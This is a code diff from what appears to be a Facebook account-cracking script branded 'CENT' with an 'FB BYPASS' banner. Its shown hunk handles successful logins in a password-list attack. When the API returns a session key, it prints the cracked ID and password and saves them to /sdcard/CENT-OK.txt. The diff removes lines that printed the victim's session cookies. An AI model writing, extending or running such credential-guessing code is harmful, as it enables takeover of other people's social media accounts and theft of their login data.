@@ -157,7 +157,7 @@ logo=("""
  [\033[1;32m*\033[1;37m] Author   : CENT
  [\033[1;32m*\033[1;37m] Facebook : CENT
  [\033[1;32m*\033[1;37m] Tool     : FREE
- [\033[1;32m*\033[1;37m] FB BYPASS  : Active version : {W}0.0.1
+ [\033[1;32m*\033[1;37m] FB BYPASS  : Active version : 0.0.1
 \033[1;37m--------------------------------------------------
  [\033[1;32m*\033[1;37m]\033[1;33mYOUR ACCOUNTs ARE SAVE IN:\033[1;32m/sdcard/CENT-OK.txt\033[1;37m
 \033[1;37m--------------------------------------------------""")
@@ -494,8 +494,6 @@ def api1(ids,names,passlist):
 				q = json.loads(po)
 				if 'session_key' in q:
 					print('\r\r\033[1;32m [CENT-OK] '+ids+' | '+pas+'\033[1;97m')
-					coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-					print("\33[0;97m[🍪] : \33[0;97m"+coki)
 					os.system('espeak -a 300 " HEY, shit, You, GOT, Successful,  account"')
 					open('/sdcard/CENT-OK.txt','a').write(ids+'|'+pas+'\n')
 					oks.append(ids)
